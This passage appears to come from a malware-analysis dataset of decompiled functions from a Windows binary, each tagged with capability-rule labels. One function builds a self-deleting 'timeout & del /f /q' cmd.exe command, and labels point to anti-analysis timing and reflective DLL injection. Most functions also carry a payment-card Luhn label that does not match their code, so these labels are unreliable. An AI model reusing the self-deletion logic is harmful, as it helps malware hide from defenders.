= *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = 0;\n    arg_ch_00[5] = 0xf;\n    arg_ch_00[4] = 0;\n    *arg_ch_00 = 0;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = 1;\n    fcn.004171b7(unaff_EBP + -0xd8, *(unaff_EBP + 0xc));\n    *(unaff_EBP + -4) = 1;\n    fcn.0041715f(2);\n    iVar2 = *(*(unaff_EBP + -0xd8) + 4);\n    if ((*(unaff_EBP + -0xcc + iVar2) & 6) == 0) {\n        (**(**(unaff_EBP + -0xa0 + iVar2) + 0x28))(unaff_EBP + -0x28, 0, 0, 1, 1);\n    }\n    else {\n        *(unaff_EBP + -0x28) = *0x4342c0;\n        *(unaff_EBP + -0x24) = *0x4342c4;\n        *(unaff_EBP + -0x20) = 0;\n        *(unaff_EBP + -0x1c) = 0;\n        *(unaff_EBP + -0x18) = 0;\n    }\n    uVar3 = *(unaff_EBP + -0x28) + *(unaff_EBP + -0x20);\n    if (arg_ch_00[4] < uVar3) {\n        fcn.0040c377(0);\n    }\n    else {\n        fcn.0040415d(uVar3, 0xffffffff);\n    }\n    fcn.0041715f(0);\n    puVar1 = arg_ch_00 + 4;\n    if (0xf < arg_ch_00[5]) {\n        arg_ch_00 = *arg_ch_00;\n    }\n    fcn.0041709e(unaff_EBP + -0xd8, arg_ch_00, *puVar1, 0);\n    iVar2 = fcn.00414ddb();\n    if (iVar2 == 0) {\n        fcn.0041416b(2, 0);\n    }\n    *(unaff_EBP + -4) = 0;\n    fcn.00414544();\n    *(unaff_EBP + -0x70) = vtable.std::ios_base.0;\n    fcn.0041d7cf(unaff_EBP + -0x70);\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 872
    },
    "00416616": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar * fcn.00416616(uint param_1)\n\n{\n    char *pcVar1;\n    uchar *puVar2;\n    char cVar3;\n    char *in_EAX;\n    int32_t iVar4;\n    char *pcVar5;\n    \n    iVar4 = (**0x44632c)();\n    pcVar5 = in_EAX;\n    if (iVar4 != 0) {\n        pcVar5 = 0x4467b8;\n        (**0x446424)(0x4467b8);\n        puVar2 = (iVar4 - in_EAX) + 0x4467b8;\n        *puVar2 = 0;\n        pcVar1 = in_EAX + 1;\n        do {\n            cVar3 = *in_EAX;\n            in_EAX = in_EAX + 1;\n        } while (cVar3 != '\\0');\n        (**0x446300)(puVar2, 0x43decc, param_1, in_EAX + (iVar4 - pcVar1));\n    }\n    return pcVar5;\n}\n",
        "token_count": 236
    },
    "00416673": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/01bb0ec37f0e4f748bf40bf8ad1af4de",
            "validate payment card number using luhn algorithm with lookup table/fb60ffb548f34d1da43070d509ac9033"
        ],
        "decompiled_code": "\nuchar * fcn.00416673(void)\n\n{\n    int32_t in_EAX;\n    uchar *puVar1;\n    uint arg_8h;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    puVar1 = fcn.0041e0ea(in_EAX);\n    *puVar1 = 0;\n    arg_8h = (**0x446518)();\n    fcn.0041fe1e(arg_8h);\n    iVar2 = 0;\n    iVar3 = in_EAX;\n    if (0 < in_EAX) {\n        do {\n            iVar2 = fcn.0041fe30();\n            (**0x446300)(puVar1, \"%s%d\", puVar1, iVar2 % 10);\n            iVar3 = iVar3 + -1;\n            iVar2 = in_EAX;\n        } while (iVar3 != 0);\n    }\n    puVar1[iVar2] = 0;\n    return puVar1;\n}\n",
        "token_count": 214
    },
    "00416b5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00416b5c(void)\n\n{\n    uint uVar1;\n    char **in_FS_OFFSET;\n    uint uStackY368;\n    uchar *puStackY364;\n    uint uStackY360;\n    char *pcStackY356;\n    char *pcStackY352;\n    uchar *puStackY348;\n    uint uStackY344;\n    uint uStackY340;\n    uchar *puStackY336;\n    char *pcStackY332;\n    uint uStack296;\n    uchar auStack268 [260];\n    uint32_t uStack8;\n    \n    uStack8 = *0x443674 ^ &stack0xfffffed8;\n    uStack296 = 0x3c;\n    fcn.00420895();\n    fcn.004257d0();\n    fcn.004257d0();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    uVar1 = (**0x446420)();\n    fcn.004169b0(uVar1);\n    (**0x4464ac)();\n    uVar1 = 1;\n    pcStackY332 = 0x416bf4;\n    fcn.00403f73();\n    pcStackY332 = \"\\\" & exit\";\n    puStackY336 = &stack0xfffffef4;\n    uStackY340 = 0x416c03;\n    (**0x4464ac)();\n    puStackY348 = &stack0xfffffef4;\n    uStackY368 = 0x3c;\n    puStackY364 = NULL;\n    uStackY360 = 0;\n    pcStackY356 = \"open\";\n    pcStackY352 = \"C:\\\\Windows\\\\System32\\\\cmd.exe\";\n    uStackY340 = 0;\n    puStackY336 = NULL;\n    uStackY344 = 0x416c36;\n    (**0x446510)();\n    uStackY344 = 0x3c;\n    pcStackY352 = &stack0xfffffe90;\n    puStackY348 = NULL;\n    pcStackY356 = 0x416c41;\n    fcn.004257d0();\n    pcStackY356 = 0x104;\n    puStackY364 = &stack0xfffffef4;\n    uStackY360 = 0;\n    uStackY368 = 0x416c4c;\n    fcn.004257d0();\n    uStackY344 = 0;\n    puStackY348 = 0x416c56;\n    (**0x446410)();\n    *in_FS_OFFSET = \"timeout /t 6 & del /f /q \\\"\";\n    pcStackY332 = 0x416c71;\n    fcn.0041e0a1(uVar1);\n    return;\n}\n",
        "token_count": 597
    },
    "00416c79": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416c79(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_3ech;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    fcn.004257d0(&var_3ech, 0, 1000);\n    arg_8h_00 = 0;\n    (**0x44648c)(0, arg_8h, 0, 0, &var_3ech);\n    fcn.0041e0a1(arg_8h_00);\n    return;\n}\n",
        "token_count": 142
    },
    "00416cd2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00416cd2(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    uVar3 = 0;\n    var_8h = 0;\n    var_4h = 0;\n    (**0x446370)(&var_8h, &var_4h);\n    if (((var_4h != 0) && (iVar1 = fcn.0041e0ea(var_4h),  iVar1 != 0)) &&\n       ((**0x4463c0)(var_8h, var_4h, iVar1),  var_8h != 0)) {\n        puVar4 = iVar1 + 0x30;\n        do {\n            iVar2 = (**0x446470)(*puVar4, L\"image/jpeg\");\n            if (iVar2 == 0) {\n                puVar4 = uVar3 * 0x4c + iVar1;\n                *arg_8h = *puVar4;\n                arg_8h[1] = puVar4[1];\n                arg_8h[2] = puVar4[2];\n                arg_8h[3] = puVar4[3];\n                return uVar3;\n            }\n            uVar3 = uVar3 + 1;\n            puVar4 = puVar4 + 0x13;\n        } while (uVar3 < var_8h);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 360
    },
    "00416edb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00416edb(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    int32_t unaff_EBP;\n    uint var_30h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_4h;\n    \n    fcn.004208c8(0x24);\n    piVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x18) = 0;\n    fcn.00417ad9(unaff_EBP + -0x28);\n    *(unaff_EBP + -4) = 0;\n    if (*(unaff_EBP + -0x24) != '\\0') {\n        uVar4 = fcn.0040e4e2();\n        *(unaff_EBP + -4) = 1;\n        piVar5 = fcn.00418cd4(uVar4);\n        fcn.0040e240();\n        iVar2 = *piVar1;\n        *(unaff_EBP + -4) = 2;\n        iVar3 = *(iVar2 + 4);\n        iVar2 = *(iVar2 + 4);\n        uVar4 = *(iVar2 + 0x38 + piVar1);\n        *(unaff_EBP + -0x30) = 0;\n        *(unaff_EBP + -0x20) = *(iVar2 + 0x40 + piVar1);\n        (**(*piVar5 + 0x1c))\n                  (unaff_EBP + -0x30, *(unaff_EBP + -0x30), uVar4, iVar3 + piVar1, *(unaff_EBP + -0x20), \n                   *(unaff_EBP + 0xc));\n        if (*(unaff_EBP + -0x30) != '\\0') {\n            *(unaff_EBP + -0x18) = 4;\n        }\n        *(unaff_EBP + -4) = 0;\n    }\n    if (*(unaff_EBP + -0x18) != 0) {\n        fcn.0041416b(*(unaff_EBP + -0x18), 0);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00417b35(unaff_EBP + -0x28);\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 627
    },
    "00416fb9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00416fb9(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    int32_t unaff_EBP;\n    uint var_30h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_4h;\n    \n    fcn.004208c8(0x24);\n    piVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x18) = 0;\n    fcn.00417ad9(unaff_EBP + -0x28);\n    *(unaff_EBP + -4) = 0;\n    if (*(unaff_EBP + -0x24) != '\\0') {\n        uVar4 = fcn.0040e4e2();\n        *(unaff_EBP + -4) = 1;\n        piVar5 = fcn.00418cd4(uVar4);\n        fcn.0040e240();\n        *(unaff_EBP + -4) = 2;\n        iVar2 = *(*piVar1 + 4);\n        iVar3 = *(*piVar1 + 4);\n        uVar4 = *(iVar3 + 0x38 + piVar1);\n        *(unaff_EBP + -0x30) = 0;\n        *(unaff_EBP + -0x20) = *(iVar3 + 0x40 + piVar1);\n        (**(*piVar5 + 0xc))(unaff_EBP + -0x30, *(unaff_EBP + -0x30), uVar4, iVar2 + piVar1, *(unaff_EBP + -0x20));\n        if (*(unaff_EBP + -0x30) != '\\0') {\n            *(unaff_EBP + -0x18) = 4;\n        }\n        *(unaff_EBP + -4) = 0;\n    }\n    if (*(unaff_EBP + -0x18) != 0) {\n        fcn.0041416b();\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00417b35(unaff_EBP + -0x28);\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 604
    },
    "0041709e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041709e(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    ulong uVar6;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_4h;\n    \n    fcn.004208c8(0x14);\n    piVar2 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x18) = 0;\n    piVar2[2] = 0;\n    piVar2[3] = 0;\n    fcn.004141a3(unaff_EBP + -0x20, piVar2);\n    *(unaff_EBP + -4) = 0;\n    if (*(unaff_EBP + -0x1c) != '\\0') {\n        *(unaff_EBP + -4) = 1;\n        uVar6 = (**(**(*(*piVar2 + 4) + 0x38 + piVar2) + 0x20))\n                          (*(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n        iVar5 = uVar6 >> 0x20;\n        uVar4 = uVar6;\n        puVar1 = piVar2 + 2;\n        uVar3 = *puVar1;\n        *puVar1 = *puVar1 + uVar4;\n        piVar2[3] = piVar2[3] + iVar5 + CARRY4(uVar3, uVar4);\n        if ((uVar4 != *(unaff_EBP + 0x10)) || (iVar5 != *(unaff_EBP + 0x14))) {\n            *(unaff_EBP + -0x18) = 3;\n        }\n        *(unaff_EBP + -4) = 0;\n    }\n    if (*(unaff_EBP + -0x18) != 0) {\n        fcn.0041416b(*(unaff_EBP + -0x18), 0);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    piVar2 = *(*(**(unaff_EBP + -0x20) + 4) + 0x38 + *(unaff_EBP + -0x20));\n    if (piVar2 != NULL) {\n        (**(*piVar2 + 8))();\n    }\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 622
    },
    "0041715f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041715f(uint arg_8h)\n\n{\n    int32_t *unaff_ESI;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    \n    if ((*(*(*unaff_ESI + 4) + 0xc + unaff_ESI) & 6) == 0) {\n        (**(**(*(*unaff_ESI + 4) + 0x38 + unaff_ESI) + 0x28))(&var_1ch, 0, 0, arg_8h, 1);\n        if ((var_14h + var_1ch == *0x4342c0) && ((var_14h >> 0x1f) + var_18h + CARRY4(var_14h, var_1ch) == *0x4342c4)) {\n            fcn.0041416b(2, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 223
    },
    "004171b7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004171b7(uint arg_8h, uint arg_ch)\n\n{\n    code **arg_ch_00;\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00420895(4);\n    piVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = 0;\n    *piVar1 = 0x43ebc8;\n    piVar1[0x1a] = vtable.std::basic_ios_char__struct_std::char_traits_char__.0;\n    *(unaff_EBP + -4) = 0;\n    arg_ch_00 = piVar1 + 4;\n    *(unaff_EBP + -0x10) = 1;\n    fcn.00414cab(piVar1, arg_ch_00);\n    *(unaff_EBP + -4) = 1;\n    *(piVar1 + *(*piVar1 + 4)) = vtable.std::basic_ifstream_char__struct_std::char_traits_char__.0;\n    fcn.0041502f(arg_ch_00);\n    *arg_ch_00 = vtable.std::basic_filebuf_char__struct_std::char_traits_char__.0;\n    *(piVar1 + 0x18) = 0;\n    *(piVar1 + 0x59) = 0;\n    fcn.00415098();\n    iVar2 = *0x4467a4;\n    piVar1[0x19] = 0;\n    piVar1[0x15] = 0;\n    piVar1[0x17] = iVar2;\n    piVar1 = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -4) = 2;\n    if (0xf < piVar1[5]) {\n        piVar1 = *piVar1;\n    }\n    iVar2 = fcn.00414d62(piVar1, 0x21);\n    if (iVar2 == 0) {\n        fcn.0041416b(2, 0);\n    }\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 529
    },
    "00417293": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00417293(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    fcn.00417a0c(0);\n    return arg_8h;\n}\n",
        "token_count": 61
    },
    "00417847": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00417847(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    fcn.00417a0c(0);\n    return arg_8h;\n}\n",
        "token_count": 61
    },
    "00417861": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00417861(void)\n\n{\n    uint32_t uVar1;\n    uint32_t extraout_ECX;\n    uint32_t *extraout_EDX;\n    int32_t unaff_EBP;\n    uint32_t uVar2;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00420895(8);\n    uVar1 = extraout_EDX[1];\n    if ((extraout_ECX < uVar1) && (uVar2 = *extraout_EDX,  uVar2 <= extraout_ECX)) {\n        if (uVar1 == extraout_EDX[2]) {\n            fcn.0041511c();\n        }\n        uVar1 = extraout_EDX[1];\n        uVar2 = ((extraout_ECX - uVar2) / 0x1c) * 0x1c + *extraout_EDX;\n        *(unaff_EBP + -0x10) = uVar1;\n        *(unaff_EBP + -0x14) = uVar1;\n        *(unaff_EBP + -4) = 0;\n    }\n    else {\n        if (uVar1 == extraout_EDX[2]) {\n            fcn.0041511c();\n        }\n        uVar1 = extraout_EDX[1];\n        *(unaff_EBP + -0x14) = uVar1;\n        *(unaff_EBP + -0x10) = uVar1;\n        *(unaff_EBP + -4) = 1;\n        uVar2 = extraout_ECX;\n    }\n    if (uVar1 != 0) {\n        fcn.0040d466(uVar2);\n    }\n    extraout_EDX[1] = extraout_EDX[1] + 0x1c;\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 434
    },
    "00417a0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00417a0c(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t extraout_ECX;\n    uchar *extraout_EDX;\n    int32_t unaff_EBP;\n    uint var_4ch;\n    uint var_48h;\n    uint var_38h;\n    uint var_34h;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_18h;\n    uint var_4h;\n    \n    fcn.004208fe(0x40);\n    uVar1 = *(extraout_ECX + 0x40);\n    *(unaff_EBP + -0x4c) = 0;\n    if (((uVar1 & 2) == 0) && (**(extraout_ECX + 0x24) != 0)) {\n        uVar1 = **(extraout_ECX + 0x24);\n        uVar5 = *(extraout_ECX + 0x3c);\n        if (*(extraout_ECX + 0x3c) < uVar1) {\n            uVar5 = uVar1;\n        }\n        iVar2 = **(extraout_ECX + 0x14);\n        *(unaff_EBP + -0x18) = 0xf;\n        *(unaff_EBP + -0x1c) = 0;\n        *(unaff_EBP + -0x2c) = 0;\n        fcn.00403fb5(iVar2, uVar5 - iVar2);\n        *(unaff_EBP + -4) = 0;\n    }\n    else {\n        if (((uVar1 & 4) != 0) || (**(extraout_ECX + 0x20) == 0)) {\n            *(unaff_EBP + -0x34) = 0xf;\n            *(unaff_EBP + -0x38) = 0;\n            *(unaff_EBP + -0x48) = 0;\n            *(unaff_EBP + -4) = 2;\n            *(extraout_EDX + 0x14) = 0xf;\n            *(extraout_EDX + 0x10) = 0;\n            *extraout_EDX = 0;\n            fcn.00403f0c();\n            goto code_r0x00417ac9;\n        }\n        iVar2 = **(extraout_ECX + 0x30);\n        iVar3 = **(extraout_ECX + 0x20);\n        iVar4 = **(extraout_ECX + 0x10);\n        *(unaff_EBP + -0x18) = 0xf;\n        *(unaff_EBP + -0x1c) = 0;\n        *(unaff_EBP + -0x2c) = 0;\n        fcn.00403fb5(iVar4, (iVar2 + iVar3) - iVar4);\n        *(unaff_EBP + -4) = 1;\n    }\n    *(extraout_EDX + 0x14) = 0xf;\n    *(extraout_EDX + 0x10) = 0;\n    *extraout_EDX = 0;\n    fcn.00403f0c();\ncode_r0x00417ac9:\n    fcn.00403f73(1, 0);\n    fcn.00420948();\n    return;\n}\n",
        "token_count": 783
    },
    "0041829f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041829f(void)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    char cVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint *unaff_ESI;\n    uint32_t unaff_EDI;\n    uint32_t unaff_retaddr;\n    char *in_stack_fffffff8;\n    \n    uVar1 = unaff_ESI[4];\n    if (uVar1 < unaff_EDI) {\n        in_stack_fffffff8 = \"invalid string position\";\n        fcn.0041d5f3(\"invalid string position\");\n    }\n    if (-uVar1 - 1 <= unaff_retaddr) {\n        unaff_retaddr = fcn.0041d5a6(\"string too long\");\n    }\n    if (unaff_retaddr != 0) {\n        iVar5 = uVar1 + unaff_retaddr;\n        cVar3 = fcn.004040c2(iVar5, 0);\n        if (cVar3 != '\\0') {\n            puVar4 = unaff_ESI;\n            puVar2 = unaff_ESI;\n            if (0xf < unaff_ESI[5]) {\n                puVar4 = *unaff_ESI;\n                puVar2 = *unaff_ESI;\n            }\n            fcn.0041e300(puVar4 + in_stack_fffffff8 + unaff_EDI, puVar2 + unaff_EDI, unaff_ESI[4] - unaff_EDI);\n            fcn.0040c12d(in_stack_fffffff8);\n            unaff_ESI[4] = iVar5;\n            if (0xf < unaff_ESI[5]) {\n                unaff_ESI = *unaff_ESI;\n            }\n            *(unaff_ESI + iVar5) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 411
    },
    "0041837d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041837d(uint32_t param_1)\n\n{\n    char in_AL;\n    ushort *puVar1;\n    ushort *puVar2;\n    char cVar3;\n    uchar *unaff_ESI;\n    \n    *unaff_ESI = 0x25;\n    puVar1 = unaff_ESI + 1;\n    if ((param_1 & 0x20) != 0) {\n        *puVar1 = 0x2b;\n        puVar1 = unaff_ESI + 2;\n    }\n    if ((param_1 & 0x10) != 0) {\n        *puVar1 = 0x23;\n        puVar1 = puVar1 + 1;\n    }\n    *puVar1 = 0x2a2e;\n    puVar2 = puVar1 + 1;\n    if (in_AL != '\\0') {\n        *puVar2 = in_AL;\n        puVar2 = puVar1 + 3;\n    }\n    param_1 = param_1 & 0x3000;\n    if (param_1 == 0x2000) {\n        cVar3 = 'f';\n    }\n    else if (param_1 == 0x3000) {\n        cVar3 = 'a';\n    }\n    else {\n        cVar3 = (param_1 != 0x1000) * '\\x02' + 'e';\n    }\n    *puVar2 = cVar3;\n    *(puVar2 + 1) = 0;\n    return;\n}\n",
        "token_count": 344
    },
    "0041886b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041886b(uint param_1, uint32_t param_2)\n\n{\n    ushort *puVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    char *unaff_EBX;\n    uchar *unaff_EDI;\n    \n    *unaff_EDI = 0x25;\n    puVar1 = unaff_EDI + 1;\n    if ((param_2 & 0x20) != 0) {\n        *puVar1 = 0x2b;\n        puVar1 = unaff_EDI + 2;\n    }\n    if ((param_2 & 8) != 0) {\n        *puVar1 = 0x23;\n        puVar1 = puVar1 + 1;\n    }\n    if (*unaff_EBX == 'L') {\n        *puVar1 = 0x3649;\n        *(puVar1 + 1) = 0x34;\n        puVar2 = puVar1 + 3;\n    }\n    else {\n        *puVar1 = *unaff_EBX;\n        puVar2 = puVar1 + 1;\n    }\n    if ((param_2 & 0xe00) == 0x400) {\n        uVar3 = 0x6f;\n    }\n    else if ((param_2 & 0xe00) == 0x800) {\n        uVar3 = ~(param_2 << 3) & 0x20U | 0x58;\n    }\n    else {\n        uVar3 = unaff_EBX[1];\n    }\n    *puVar2 = uVar3;\n    puVar2[1] = 0;\n    return;\n}\n",
        "token_count": 377
    },
    "00418b1d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418b1d(code **param_1)\n\n{\n    *param_1 = vtable.std::numpunct_char_.0;\n    fcn.0041ebd2(param_1[2]);\n    fcn.0041ebd2(param_1[4]);\n    fcn.0041ebd2(param_1[5]);\n    *param_1 = vtable.std::locale::facet.0;\n    return;\n}\n",
        "token_count": 101
    },
    "00418bed": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00418bed(uint *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t arg_10h_00;\n    uint *puVar3;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    \n    while( true ) {\n        iVar2 = fcn.0041ecc0(in_EAX, 0, arg_ch);\n        arg_10h_00 = arg_ch;\n        if (iVar2 != 0) {\n            arg_10h_00 = iVar2 - in_EAX;\n        }\n        puVar3 = fcn.00418bbb(arg_14h, arg_18h, arg_10h_00);\n        arg_14h = *puVar3;\n        arg_18h = puVar3[1];\n        if (arg_ch - arg_10h_00 == 0) break;\n        if (arg_10h != '\\0') {\n            arg_14h = *puVar3;\n            arg_18h = puVar3[1];\n            fcn.00418c75();\n        }\n        in_EAX = in_EAX + arg_10h_00 + 1;\n        arg_ch = (arg_ch - arg_10h_00) + -1;\n    }\n    uVar1 = *puVar3;\n    arg_8h[1] = puVar3[1];\n    *arg_8h = uVar1;\n    return arg_8h;\n}\n",
        "token_count": 366
    },
    "0041a1c7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041a1c7(void)\n\n{\n    int32_t in_EAX;\n    ushort *puVar1;\n    int32_t iVar2;\n    \n    puVar1 = in_EAX + 0x14;\n    iVar2 = 0x11e;\n    do {\n        *puVar1 = 0;\n        puVar1 = puVar1 + 2;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    puVar1 = in_EAX + 0x908;\n    iVar2 = 0x1e;\n    do {\n        *puVar1 = 0;\n        puVar1 = puVar1 + 2;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    puVar1 = in_EAX + 0xef4;\n    iVar2 = 0x13;\n    do {\n        *puVar1 = 0;\n        puVar1 = puVar1 + 2;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    *(in_EAX + 0x414) = 1;\n    *(in_EAX + 0x1af40) = 0;\n    *(in_EAX + 0x1af3c) = 0;\n    *(in_EAX + 0x1af34) = 0;\n    *(in_EAX + 0x1af30) = 0;\n    *(in_EAX + 0x1af2c) = 0;\n    *(in_EAX + 0x1af38) = 0x100;\n    return;\n}\n",
        "token_count": 365
    },
    "0041a238": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041a238(int32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t in_EAX;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t unaff_EDI;\n    bool bVar10;\n    uint var_4h;\n    \n    iVar5 = *(in_EAX + 0x1004 + arg_8h * 4);\n    iVar9 = *(in_EAX + 0x18f8);\n    iVar8 = arg_8h * 2;\n    bVar10 = SBORROW4(iVar8, iVar9);\n    iVar7 = iVar8 - iVar9;\n    if (iVar8 <= iVar9) {\n        do {\n            iVar9 = iVar8;\n            if (bVar10 != iVar7 < 0) {\n                iVar7 = *(in_EAX + 0x1008 + iVar8 * 4);\n                uVar3 = *(unaff_EDI + iVar7 * 4);\n                uVar4 = *(unaff_EDI + *(in_EAX + 0x1004 + iVar8 * 4) * 4);\n                if ((uVar3 < uVar4) ||\n                   ((uVar3 == uVar4 &&\n                    (uVar2 = *(iVar7 + 0x1900 + in_EAX),  puVar1 = *(in_EAX + 0x1004 + iVar8 * 4) + 0x1900 + in_EAX, \n                    uVar2 < *puVar1 || uVar2 == *puVar1)))) {\n                    iVar9 = iVar8 + 1;\n                }\n            }\n            iVar7 = *(in_EAX + 0x1004 + iVar9 * 4);\n            uVar3 = *(unaff_EDI + iVar5 * 4);\n            uVar4 = *(unaff_EDI + iVar7 * 4);\n            if ((uVar3 < uVar4) ||\n               ((uVar3 == uVar4 &&\n                (uVar2 = *(iVar5 + 0x1900 + in_EAX),  puVar1 = iVar7 + 